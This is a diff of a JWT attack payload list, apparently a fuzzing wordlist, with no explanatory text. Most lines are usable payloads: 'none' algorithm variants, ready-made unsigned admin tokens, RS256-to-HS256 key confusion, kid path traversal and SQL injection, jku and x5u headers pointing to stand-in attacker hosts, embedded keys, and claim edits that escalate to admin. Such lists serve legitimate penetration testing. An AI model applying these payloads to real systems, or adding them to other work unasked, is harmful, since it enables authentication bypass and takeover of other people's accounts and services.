@@ -1,23 +1,50 @@
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
-
-{"kid": "../../dev/null", "alg": "HS256"}
-{"kid": "../../../dev/null", "alg": "HS256"}
-{"kid": "/dev/null", "alg": "HS256"}
-
-{"kid": "x' UNION SELECT 'attacker_secret'--", "alg": "HS256"}
-{"kid": "' OR '1'='1", "alg": "HS256"}
-
-{"kid": "http://COLLABORATOR/key", "alg": "HS256"}
-{"kid": "http://localhost:6379/key", "alg": "HS256"}
-
-{"alg":"RS256","jku":"https://ATTACKER/jwks.json"}
-{"alg":"RS256","x5u":"https://ATTACKER/cert.pem"}
-
-{
-  "alg": "RS256",
-  "jwk": {
-    "kty": "RSA",
-    "n": "ATTACKER_MODULUS",
-    "e": "AQAB"
-  }
-}
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
+{"alg":"HS256"} (change RS256 to HS256, sign with public key)
+{"alg":"HS384"} (RS384 to HS384)
+{"alg":"HS512"} (RS512 to HS512)
+{"alg":"ES256"} algorithm confusion
+{"alg":"PS256"} algorithm confusion
+{"kid":"../../etc/passwd"} key injection
+{"kid":"/dev/null"} key injection to empty
+{"kid":"sql_injection_here"} SQLi via kid
+{"kid":"ldap_injection_here"} LDAPi via kid
+{"kid":"1 OR 1=1--"} SQLi in kid
+{"kid":"../../../../../../../dev/null"} path traversal in kid
+{"jku":"https://attacker.com/jwks.json"} remote JWK set URL
+{"x5u":"https://attacker.com/cert.pem"} remote certificate URL
+{"x5c":"attacker_controlled_cert"} embedded certificate
+{"jwk":{"kty":"oct","k":"attacker_key"}} embedded JWK
+{"cty":"JWT"} nested JWT
+Modify exp to far future: {"exp":9999999999}
+Modify exp to remove: remove exp claim entirely
+Modify nbf to past: {"nbf":1}
+Modify iat to future: {"iat":9999999999}
+Modify iss to bypass: {"iss":"trusted_issuer"}
+Modify aud to bypass: {"aud":"target_service"}
+Modify sub to admin: {"sub":"admin"}
+Modify role to admin: {"role":"admin"}
+Modify is_admin to true: {"is_admin":true}
+Modify admin to true: {"admin":true}
+Modify user_id to 1: {"user_id":1}
+Modify scope to admin: {"scope":"admin:all"}
+Modify permissions to all: {"permissions":["*"]}
+Modify groups to admins: {"groups":["admins","superadmins"]}
+RS256 JWT signed with HS256 using RSA public key as HMAC secret
+ES256 JWT stripped signature
+PS256 JWT algorithm confusion
+{"alg":"RS256","crv":"P-256"} algorithm confusion
+JWT with empty signature field
+JWT with null signature
+JWT with invalid base64 in signature
+JWT with truncated signature
+JWT replay after logout
+JWT reuse after password change
+JWT reuse after token revocation
+Brute force short secret (under 8 chars)
+Brute force numeric-only secret
+Brute force common word secrets
